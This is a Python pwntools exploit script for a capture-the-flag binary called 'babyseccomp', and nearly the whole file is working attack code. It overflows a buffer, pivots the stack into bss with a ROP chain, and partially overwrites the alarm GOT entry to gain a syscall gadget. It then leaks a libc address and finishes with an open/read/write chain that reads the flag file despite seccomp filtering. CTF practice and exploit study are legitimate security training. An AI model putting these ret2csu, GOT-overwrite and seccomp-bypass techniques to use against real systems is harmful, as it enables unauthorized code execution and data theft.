#!/usr/bin/python
from pwn import *
import sys

HOST = "10.7.3.94"
PORT = 31337

POPRDI = 0x0000000000400b03
POPRSIR15 = 0x0000000000400b01
LEAVERET = 0x00000000004009c9

# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
POPALL = 0x000000000400AFA

# mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
CALLER = 0x400ae0

def call_func(func, rdi, rsi, rdx):
  result = ""
  result += p64(POPALL)
  result += p64(0)
  result += p64(1)
  result += p64(func)   # r12
  result += p64(rdx)    # r13 => rdx
  result += p64(rsi)    # r14 => rsi
  result += p64(rdi)    # r15
  result += p64(CALLER)
  result += p64(0xdeadbeef)
  result += p64(0)
  result += p64(0)
  result += p64(0)
  result += p64(0)
  result += p64(0)
  result += p64(0)

  return result

def exploit(r):
	payload = "A"*8
	payload += p64(0x601500-8)

	# Stage1 : Read bigger ropchain to bss
	payload += p64(POPRDI)
	payload += p64(0x601500)
	payload += p64(POPRSIR15)
	payload += p64(0x1000)
	payload += p64(0)
	payload += p64(e.functions["readStr"].address)
	payload += p64(LEAVERET)	
	r.sendline(payload)

	# overwrite alarm LSB to get a syscall gadget
	payload = p64(POPRDI)
	payload += p64(e.got["alarm"])
	payload += p64(POPRSIR15)
	payload += p64(1)
	payload += p64(0)
	payload += p64(e.functions["readStr"].address)

	# read (0, 601200, 1) => set rax to 1
	payload += call_func(e.got["read"], 0, 0x601200, 0x1)

	# calling alarm will now result in write(1, 0x601030, 0x8) => leak got entry
	payload += call_func(e.got["alarm"], 1, 0x000000000601030, 0x8)

	# read another ropchain
	payload += p64(POPRDI)
	payload += p64(0x601650)
	payload += p64(POPRSIR15)
	payload += p64(0x300)
	payload += p64(0)
	payload += p64(e.functions["readStr"].address)
	# next payload will be read directly behind last ropchain call

	pause()
	# send next ropchain
	r.sendline(payload)
	pause()
	# send byte to overwrite alarm LSB
	r.send(p8(0x45))
	pause()
	# send byte to set rax to 1
	r.send(p8(0xff))

	# leak setbuf got
	SETBUF = u64(r.recv(6).ljust(8, "\x00"))

	log.info("SETBUF                  : %s" % hex(SETBUF))

	libc.address = SETBUF - libc.symbols["setbuf"]

	log.info("LIBC                    : %s" % hex(libc.address))

	POPRAX = libc.address + 0x00000000000439c8
	POPRSI = libc.address + 0x0000000000023e6a
	POPRDX = libc.address + 0x0000000000001b96
	SYSCALL = libc.address + 0x00000000000d2975

	# send final open/read/write ropchain
	
	# open flag
	payload = p64(POPRAX)
	payload += p64(2)
	payload += p64(POPRDI)
	payload += p64(0x601728)   # address of flag string
	payload += p64(POPRSI)
	payload += p64(0)
	payload += p64(POPRDX)	
	payload += p64(0)
	payload += p64(SYSCALL)
	
	# read flag
	payload += p64(POPRAX)
	payload += p64(0)
	payload += p64(POPRDI)
	payload += p64(3)
	payload += p64(POPRSI)
	payload += p64(0x601400)
	payload += p64(POPRDX)
	payload += p64(100)
	payload += p64(SYSCALL)

	# write flag
	payload += p64(POPRAX)
	payload += p64(1)
	payload += p64(POPRDI)
	payload += p64(1)
	payload += p64(POPRSI)
	payload += p64(0x601400)
	payload += p64(POPRDX)
	payload += p64(100)
	payload += p64(SYSCALL)

	# and location of flag to ropchain
	payload += "/home/babyseccomp/flag\x00"

	pause()
	r.sendline(payload)

	r.interactive()

	return

if __name__ == "__main__":
	e = ELF("./babyseccomp")
	libc = ELF("./libc.so.6")
	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./babyseccomp", env={"LD_LIBRARY_PATH" : ".", "LD_PRELOAD" : "./libc.so.6"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
